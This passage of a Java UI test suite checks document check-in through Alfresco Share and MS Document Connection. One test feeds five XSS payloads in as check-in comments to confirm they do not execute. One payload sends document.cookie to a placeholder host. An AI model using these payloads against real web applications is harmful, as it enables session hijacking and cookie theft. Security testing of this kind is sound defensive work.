        // ---- Step 1 ----
        // ---- Step action ----
        // Enter any data.
        // ---- Expected results ----
        // The data is entered.
        appExcel2011.edit("From Iasi with Love");

        // ---- Step 2 ----
        // ---- Step action ----
        // In Document Connection app, choose the checkout document and click on Discard button.
        // ---- Expected results ----
        // The document stopped editing. It is not marked out as checked out. No changes are applied.
        getMDC().clickDiscard();
        appExcel2011.exitApplication();

        // ---- Step 3 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document is not locked. No version was created. No changes were applied.
        documentLibraryPage.getDrone().refresh();

        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertTrue(docDetailsPage.isCheckedOut(), "The document is not locked.");
        Assert.assertEquals(oldVersion, currentVersion, "No version was created. No changes were applied.");
    }

    /*
     * Any site is created in Share;
     * Any MS Excel document is uploaded;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened;
     * The document is checked out;
     * Some changes are made for the document;
     * The changes are saved and Word app is closed.
     */
    @Test(groups = "Enterprise4.2", description = "Check In document. Comment with XSS")
    public void AONE_9775() throws Exception
    {

        String[] xssComments = new String[5];
        xssComments[0] = "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">";
        xssComments[1] = "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">";
        xssComments[2] = "<DIV STYLE=\"width: expression(alert('XSS'));\">";
        xssComments[3] = "<IMG STYLE=\"xss:expr/*XSS*/session(alert('XSS'))\">";
        xssComments[4] = "<img><scrip<script>t>alert('XSS');<</script>/script>";

        String strCheckInComment = "";
        String testFile = xls9775TestFile.getName();
        String currentVersion = "";

        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        openDocumentLibraryForTest();
        // we need to know first the current version of the document
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(testFile).render();

        for (int i = 0; i < xssComments.length; i++)
        {

            strCheckInComment = xssComments[i];

            getMDC().checkOutFile(testFile);
            appExcel2011.waitForWindow(testFile);
            appExcel2011.setFileName(testFile);
            appExcel2011.focus();
            appExcel2011.save();
            appExcel2011.closeFile();

            documentLibraryPage.getDrone().refresh();
            String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();

            // ---- Step 1 ----
            // ---- Step action ----
            // Click on the document and then click on the Check In button on the top panel.
            // ---- Expected results ----
            // Check In window is displayed.
            getMDC().clickFirstDocument();

            // ---- Step 2 ----
            // ---- Step action ----
            // Enter one of the following strings to the Comments section:
            // <IMG """><SCRIPT>alert("test")</SCRIPT>">
            // <img src="1" onerror="window.open('http://somenastyurl?'+(document.cookie))">
            // <DIV STYLE="width: expression(alert('XSS'));">
            // <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
            // <img><scrip<script>t>alert('XSS');<</script>/script>
            // ---- Expected results ----
            // Comment is entered. No XSS attack is made.

            // ---- Step 3 ----
            // ---- Step action ----
            // Click on CheckIn button button.
            // ---- Expected results ----
            // Check In window is closed. No XSS attack is made. Data proceeded correctly. The document is not marked as checked out.
            getMDC().clickCheckIn();
            getMDC().checkInWithComment(strCheckInComment);

            // ---- Step 4 ----
            // ---- Step action ----
            // Log into the Share.
            // ---- Expected results ----
            // User is logged in successfully.

            // {paulb: we are already logged in from prerequisites}

            // ---- Step 5 ----
            // ---- Step action ----
            // Verify the document.
            // ---- Expected results ----
            // The document is checked in. Changes are applied. Version is increased to a new major version. Entered string is added as a comment. No XSS attack
            // is made.
            documentLibraryPage.getDrone().refresh();

            currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
            Assert.assertFalse(docDetailsPage.isCheckedOut(), "The document is checked in.");
            Assert.assertNotEquals(oldVersion, currentVersion, "Changes are applied. Version is increased to a new major version.");
            Assert.assertEquals(docDetailsPage.getCurrentVersionDetails().getComment(), strCheckInComment,
                    "Entered string is added as a comment. No XSS attack is made");

            // ---- Step 6 ----
            // ---- Step action ----
            // Verify the same scenario against all the left strings.
            // ---- Expected results ----
            // Performed correctly. No XSS attack is made.
            // {paulb: see the loop above}
        }
        getMDC().exitApplication();
    }

    /*
     * Any site is created in Share;
     * Any MS Excel document is uploaded;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened;
     * The document is checked out;
     * Some changes are made for the document;
     * The changes are saved and Word app is closed.
     */
    @Test(groups = "Enterprise4.2", description = "Check In document. Empty comment")
    public void AONE_9776() throws Exception
    {

        String testFile = xls9776TestFile.getName();
        String currentVersion = "";

        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        openDocumentLibraryForTest();
        // we need to know first the current version of the document
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(testFile).render();

        getMDC().checkOutFile(testFile);
        appExcel2011.waitForWindow(testFile);
        appExcel2011.setFileName(testFile);
        appExcel2011.focus();
        appExcel2011.save();
        appExcel2011.closeFile();

        documentLibraryPage.getDrone().refresh();
        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();

        // ---- Step 1 ----
        // ---- Step action ----
        // Click on the document and then click on the Check In button on the top panel.
        // ---- Expected results ----
        // Check In window is displayed.
        getMDC().clickFirstDocument();

        // ---- Step 2 ----
        // ---- Step action ----
        // Leave the Comments section empty.
        // ---- Expected results ----
        // No data is entered.

        // ---- Step 3 ----
        // ---- Step action ----
        // Click on CheckIn button button.
        // ---- Expected results ----
        // Check In window is closed. No XSS attack is made. Data proceeded correctly. The document is not marked as checked out.
        getMDC().clickCheckIn();
        getMDC().checkInWithComment(" ");

        // ---- Step 4 ----
        // ---- Step action ----
        // Log into the Share.
        // ---- Expected results ----
        // User is logged in successfully.

        // {paulb: we are already logged in from prerequisites}

        // ---- Step 5 ----
        // ---- Step action ----
        // Verify the document.
        // ---- Expected results ----
        // The document is checked in. Changes are applied. Version is increased to a new major version. Entered string is added as a comment. No XSS attack
        // is made.
        documentLibraryPage.getDrone().refresh();

        currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertFalse(docDetailsPage.isCheckedOut(), "The document is checked in.");
        Assert.assertNotEquals(oldVersion, currentVersion, "Changes are applied. Version is increased to a new major version.");
        Assert.assertEquals(docDetailsPage.getCurrentVersionDetails().getComment(), "(No Comment)", "No comment is added to the version.");

        getMDC().exitApplication();
    }

    /*
     * Any site is created in Share;
     * Any MS Excel document is uploaded;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened;
     * The document is checked out;
     * Some changes are made for the document;
     * The changes are saved and Word app is closed.
     */
    @Test(groups = "Enterprise4.2", description = "Check In document. Comment with wildcards")
    public void AONE_9777() throws Exception
    {

        String testFile = xls9777TestFile.getName();
        String currentVersion = "";
        String strComment = "!@#$%^&*()_+|\\/?.,<>:;\"'`=-{}[]";

        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        openDocumentLibraryForTest();
        // we need to know first the current version of the document
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(testFile).render();

        getMDC().checkOutFile(testFile);
        appExcel2011.waitForWindow(testFile);
        appExcel2011.setFileName(testFile);
        appExcel2011.focus();
        appExcel2011.save();
        appExcel2011.closeFile();

        documentLibraryPage.getDrone().refresh();
        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();

        // ---- Step 1 ----
        // ---- Step action ----
        // Click on the document and then click on the Check In button on the top panel.
        // ---- Expected results ----
        // Check In window is displayed.
        getMDC().clickFirstDocument();

        // ---- Step 2 ----
        // ---- Step action ----
        // Enter any string which contains wildcards to the Comments section, e.g. !@#$%^&*()_+|\/?.,<>:;"'`=-{}[].
        // ---- Expected results ----
        // Data is entered.

        // ---- Step 3 ----
        // ---- Step action ----
        // Click on CheckIn button button.
        // ---- Expected results ----
        // Check In window is closed. Data proceeded correctly. The document is not marked as checked out.
        getMDC().clickCheckIn();
        getMDC().checkInWithComment(strComment);

        // ---- Step 4 ----
        // ---- Step action ----
        // Log into the Share.
        // ---- Expected results ----
        // User is logged in successfully.

        // {paulb: we are already logged in from prerequisites}

        // ---- Step 5 ----
        // ---- Step action ----
        // Verify the document.
        // ---- Expected results ----
        // The document is checked in. Changes are applied. Version is increased to a new major version. Entered string is added as a comment. No XSS attack
        // is made.
        documentLibraryPage.getDrone().refresh();

        currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertFalse(docDetailsPage.isCheckedOut(), "The document is checked in.");
        Assert.assertNotEquals(oldVersion, currentVersion, "Changes are applied. Version is increased to a new major version.");
        Assert.assertEquals(docDetailsPage.getCurrentVersionDetails().getComment(), strComment, "No comment is added to the version.");

        getMDC().exitApplication();
    }
}
